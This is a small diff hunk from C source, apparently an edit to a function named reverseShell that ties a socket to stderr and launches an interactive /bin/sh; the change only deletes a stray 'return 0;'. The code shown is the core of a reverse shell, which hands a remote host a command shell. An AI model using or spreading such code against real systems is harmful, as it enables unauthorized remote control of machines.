@@ -116,5 +116,4 @@ void reverseShell(char *REMOTE_ADDR){
     dup2(s, 2);
 
     execl("/bin/sh", "/bin/sh", "-i", NULL);
-    return 0;
 }
